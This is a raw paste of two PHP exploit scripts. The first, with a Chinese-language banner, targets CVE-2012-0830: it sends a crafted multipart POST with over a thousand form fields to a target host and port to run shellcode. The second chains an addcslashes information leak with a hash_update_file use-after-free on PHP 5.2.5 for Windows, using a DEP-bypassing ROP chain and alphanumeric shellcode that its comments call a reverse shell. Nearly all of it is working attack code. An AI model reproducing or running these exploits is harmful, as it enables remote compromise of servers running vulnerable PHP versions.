php overflow
<?php
 
echo <<<BANNER
                 CVE2012-0830 remote shellcode execute exploit
漏洞文章：http://www.laruence.com/2012/02/08/2528.html
测试平台：Apache/2.2.21 (Win32) PHP/5.3.9  
                           代码维护：ylbhz@hotmail.com
good luck!
>php exp.php <host> <port> <path>
>php exp.php 192.168.194.129 8887 1.php
 
    经过ADD ESI,23的调整，ESI指向你放入的SHELLCODE开头，也可以
放入任意shellcode，但必须经过URL编码。
 
 
BANNER;
if ($argc != 4) exit("参数不正确");
 
 
$shellcode = "\xcc\xcc";
$host = $argv[1];//"192.168.194.129";
$port = $argv[2];//"8887";
$path = $argv[3];//"1.php";
 
$shellcode = "\xcc\xcc";//for test:int 3
 
 
 
$hashtable  = "\xeb\x1e\x90\x90\x00\x00\x00\x00AAAA\xff\xe6\x90\x90AAAAAAAA\xf4\xe3\x5d\x01\x00\x0f\x01\x00";
$hashtable .= "\x83\xc6\x23"; //add esi,23
$hashtable .= $shellcode;
 
$body  = "-----------------------------7dc38bcb023e\r\n";
$body .= "Content-Disposition: form-data; name=\"x\";\r\n";
$body .= "\r\n";
$body .= "$hashtable\r\n";
$body .= "\r\n";
 
for($i = 0;$i < 1000;$i ++)
{
    $body .= "-----------------------------7dc38bcb023e\r\n";
    $body .= "Content-Disposition: form-data; name=\"y$i\";\r\n";
    $body .= "\r\n";
    $body .= "1\r\n";
    $body .= "\r\n";
}
 
$body .= "-----------------------------7dc38bcb023e\r\n";
$body .= "Content-Disposition: form-data; name=\"x[]\";\r\n";
$body .= "\r\n";
$body .= "1\r\n";
$body .= "\r\n";
 
$body .= "-----------------------------7dc38bcb023e\r\n";
$body .= "Content-Disposition: form-data; name=\"x[0]\";\r\n";
$body .= "\r\n";
$body .= "1\r\n";
$body .= "\r\n";
 
 
$body .= "-----------------------------7dc38bcb023e--\r\n";
$body .= "\r\n\r\n";
 
$size = strlen($body);
 
$header  = "POST /$path HTTP/1.1\r\n";
$header .= "Accept: */*\r\n";
$header .= "Referer: http://$host/$path\r\n";
$header .= "Accept-Language: zh-cn\r\n";
$header .= "Content-Type: multipart/form-data; boundary=---------------------------7dc38bcb023e\r\n";
$header .= "Accept-Encoding: gzip, deflate\r\n";
$header .= "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)\r\n";
$header .= "Host: $host\r\n";
$header .= "Content-Length: $size\r\n";
$header .= "Connection: Close\r\n";
$header .= "Cache-Control: no-cache\r\n";
$header .= "\r\n";
 
$packet = $header.$body;
 
$fp = fsockopen(gethostbyname($host), $port); 
if (!$fp) {     echo "No response from $host\r\n"; die;     }
fputs($fp, $packet); 
 
?>

 

------------------------------------------------------------------------------------------

<?php
//////////////////////////  addcslashes() && hash_update_file() Combo Exploit(Win32 <= PHP 5.2.5) (DEP bypass) (win2k3)
///////////// MOPS-2010-001: PHP hash_update_file() Already Freed Resource Access Vulnerability see:http://www.nosec.org/2010/0504/512.html
///////////// MOPS-2010-006: PHP addcslashes() Interruption Information Leak Vulnerability  see:http://www.nosec.org/2010/0504/514.html
/////////////  
///////////// TEST in Apache/2.2.6 (Win32) PHP/5.2.5 On Windows 2003 sp2 cn
///////////// shellcode is reverse shell create by alpha2 ,eax is beggining of code
 
//0x20 will repalced by php to 0x5f and notice stripcslashes or MAIGIC_QUOTES
//这个版本前面部分shellcode必须按照这个布置。
$sc = "\x8B\xC4".                    //MOV EAX,ESP
      "\x83\xC0\x0D".                //ADD EAX,0D
 
"PYIIIIIIQZAkA0D2A00A0kA0D2A12B10B1ABjAX8A1uIN".
 
"ylKXMYuPePEPqpOyKUDqKbQtnkV2fPNkqBdLNk1BTTLKrRvHDOH71ZTfVQKO".
 
"6QYPLlWLsQcL4BTl7PkqjoFm31kwyrxppRPWNkaBTPLKqR7LUQjpLK3prXOu".
 
"9PrTQZ5QZp60lKSxUHLKbxGPs1jsKSUl1YNk4tNkUQKfp19otqkpNLo1zotM".
 
"UQKwDxKPt5L433qmyhUk1mut0um2pXLK1HUtWqKcSVlKtL0KlKshULfan3LK".
 
"Gtnk31HPOy2d4dgTqKck3QpYRzRqyoyp1HqOaJLKwbzKnfQMqxvSfRC0S0ax".
 
"ag3CtrcoQDRHrlrWGVs7KOn5LxNp6aePWptiyTsdRpQxuyopPkuP9oJurpBp".
 
"RprpW0rpqPPPCXKZ4OkokPkOXUk99W58KpY8o2UQqxWr5PWonpOyjFqzfppV".
 
"67U8oiLeQdQqkOiEcXsSpm54uPMYm3pWv767VQZVbJwbpYPVYrKMBFKwW4WT".
 
"5l6auQLMctVD6pkvS0ctcdrpRvV60V76aFBnPV2v63pVqxsI8LWOMVkOKeNi".
 
"kPPNCfQV9o6PRHWxNgEMu0KOhUMkJPmeY266RHY6NuOMmMkOYEUlwvSLWzMP".
 
"KKYp2UtEOKswb342porJ7pRsKOkeA";
 
$stack_addr = 0;
$stack_pivot = "".
"\xa7\xda\x65\x77". //0x7765daa7 :  # POP ESI # POP ESP # POP ESI # POP EBX # POP EBP # RETN 04    ** [OLEAUT32.dll]
    /* EBP --> & jmp esp */
"\xa4\xde\xa2\x7c". //0x7ca2dea4 : jmp esp |  {PAGE_EXECUTE_READ} [SHELL32.dll]  
    /* EBX == 0x1000 */
"\x81\xed\x87\x7c". //0x7c87ed81 :  # POP EAX # RETN    ** [kernel32.dll]
"\x41\x41\x41\x41". //JUNK
"\x5f\x42\x80\x7c". //Ptr to 0x00001000 in kernel32.text
"\x8d\xf2\xa8\x7c". //0x7ca8f28d :  # MOV EAX,DWORD PTR DS:[EAX] # RETN    ** [shell32.dll]  
"\xcf\x79\x55\x77". //0x775579cf :  # XCHG EAX,EBX # RETN    ** [ole32.dll]
   /* EDX == 0x00000040 PAGE_EXECUTE_READWRITE */
"\x81\xed\x87\x7c". //0x7c87ed81 :  # POP EAX # RETN    ** [kernel32.dll]
"\xf2\x31\x80\x7c". //Ptr to 0x00000040 in kernel32.text
"\x8d\xf2\xa8\x7c". //0x7ca8f28d :  # MOV EAX,DWORD PTR DS:[EAX] # RETN    ** [shell32.dll]  
"\xb8\xf1\xa6\x7c". //0x7ca6f1b8 :  # XCHG EAX,EDX # RETN    ** [shell32.dll]
   /* ESI == &VirtualProtect() */
"\xe7\x7e\x80\x7c". //0x7c807ee7 :  # POP ESI # RETN    ** [kernel32.dll]
"\xe3\x1f\x80\x7c". //&VirtualProtect()
   /* EDI == & RETN */
"\xe7\x44\x80\x7c". //0x7c8044e7 :  # POP EDI # RETN    ** [kernel32.dll]
"\xe8\x44\x80\x7c". //RETN
   /* EAX == 0x90909090 after call,to be NOP on stack */
"\x81\xed\x87\x7c". //0x7c87ed81 :  # POP EAX # RETN    ** [kernel32.dll]
"\x90\x90\x90\x90". //NOP NOP NOP NOP
   /* ESP is auto */
   /* ECX --> pOldProtect a writable address */
"\x7f\x04\xb9\x7c". //0x7cb9047f :  # POP ECX # RETN    ** [shell32.dll]
"\x04\xb0\x88\x7c". //kernel32.data + 0x04  lpOldProtect
   /* pushad # retn */
"\x7c\x41\xa3\x7c". //0x7ca3417c :  # PUSHAD # RETN    ** [shell32.dll]
"\x90\x90\x90\x90".$sc;
$MyArr = Array();
$MyArr[0] = $stack_pivot;
/////////////////////////////////////////////////////////////////////  Use addcslashes() Interruption Information Leak Vulnerability to GET variables address
 
    class code
    {
        function __toString()
        {
        global $MyArr;                        
            parse_str($MyArr[0]."=1", $GLOBALS['shellcode']);
            return "";
        }
    }
  $GLOBALS['shellcode'] = str_repeat("A", 67);
    $x = stripcslashes(addcslashes(&$GLOBALS['shellcode'], new code()));
    $code_addr = hexdump($x);
 
    class dummy
    {
        function __toString()
        {
              global $code_addr;
        global $stack_addr;
              echo sprintf("Code Address At:0x%08X\r\n", $code_addr);
        $stack_addr = $code_addr;                       
            parse_str(pack("L", $code_addr)."=1", $GLOBALS['var']);
            return "";
        }
    }
    $GLOBALS['var'] = str_repeat("A", 67);
    $x = stripcslashes(addcslashes(&$GLOBALS['var'], new dummy()));
    $var_addr = hexdump($x);
 
    function hexdump($x)  
    {
    $ret_long = ord($x[0x13]) * 0x1000000 + ord($x[0x12]) * 0x10000 + ord($x[0x11]) * 0x100 + ord($x[0x10]);
    $ret_long = $ret_long + 0x20;  //offset 0x20 point to variable
 
    return $ret_long;
    }
/////////////////////////////////////////////////////////////////////  Use to hash_update_file() Already Freed Resource Access Vulnerability to hijack EIP to $sc
  class AttackStream {
    function stream_open($path, $mode, $options, &$opened_path)
    {
      return true;
    }
 
    function stream_read($count)
    {
      global $var_addr;
      global $stack_addr;
      hash_final($GLOBALS['hid'], true);
      echo sprintf("Pointer Address At:0x%08X\r\n", $var_addr);
 
echo sprintf("Make stackpivot At code address:0x%08X\r\n", $stack_addr);
//$var_addr = 0x41414141;
//$stack_addr = 0x41414141;
    //  $GLOBALS['aaaaaaaaaaaaaaaaaaaaaa'] = str_repeat(pack("L", $var_addr - 0x04), 3);  //CALL [edx + 4], so we will sub 0x04
      $GLOBALS['aaaaaaaaaaaaaaaaaaaaaa'] = str_repeat(pack("L", $stack_addr - 0x04), 3);  //CALL [edx + 4], so we will sub 0x04
      return "A";
    }
 
    function stream_eof()
    {
      return true;
    }
 
    function stream_seek($offset, $whence)
    {
               return false;
    }
  }
 // stream_wrapper_register("attack", "AttackStream") or die("Failed to register protocol");
stream_wrapper_register("cccc", "AttackStream") or die("Failed to register protocol");
  $hid = hash_init('md5');
 // hash_update_file($hid, "attack://nothing");
hash_update_file($hid, "cccc://cccccccccccccccccccccccccccccccccccccccccccccccccccccccc");
?>
